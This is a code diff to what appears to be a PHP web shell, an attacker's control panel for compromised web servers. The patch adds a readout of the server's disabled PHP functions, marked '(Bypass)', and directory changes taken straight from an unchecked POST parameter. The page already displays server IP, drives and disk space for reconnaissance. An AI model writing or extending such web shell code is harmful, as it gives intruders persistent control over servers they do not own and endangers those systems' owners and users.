@@ -225,6 +225,9 @@ function actionSecInfo() {
 	echo '</div>';
 
 }
+//Disable Function
+$disable_functions = @ini_get('disable_functions');
+
 // ================================
 // if user is logged in
 if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
@@ -320,10 +323,14 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								else{
 									echo 'Safe mode:<font color="green"> OFF </font><br />';
 								} 
+								if( isset( $_POST['c'] ) )
+								@chdir($_POST['c']);
 								$cwd = @getcwd();
 								$GLOBALS['cwd'] = @getcwd();
 								$freeSpace = @disk_free_space($GLOBALS['cwd']);
 								$totalSpace = @disk_total_space($GLOBALS['cwd']);
+								$home_cwd = @getcwd();
+
 								$cwd_links = '';
 								$path = explode("/", $GLOBALS['cwd']);
 								$n=count($path);
@@ -336,11 +343,11 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								
 								?>
 								
-								<a href="?file=">C:\</a><a href="?file=">xampp\</a><a href="?file=">htdocs\</a><a href="?file=">shell\</a>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
+								<?php echo 'Directory : '.$cwd_links.' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a>' ?>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
 								<br>Filesystem Mounted: <?php echo "<span>Free</span> ".viewSize($freeSpace)." of ".viewSize($totalSpace)."  (".(int)($freeSpace/$totalSpace*100)."%)"; ?> 
 								<br>ifconfig : <?=gethostbyname($_SERVER["HTTP_HOST"])?> <a href="http://whois.domaintools.com/<?=gethostbyname($_SERVER["HTTP_HOST"])?>">(Whois)</a>
 								<br />Detected drives: <?=$drives?><br />
-								Disabled Functions : None (Bypass)<br />
+								Disabled Functions : <?=$disable_functions?> (Bypass)<br />
 					</p>
 			</td>
 		</tr>		
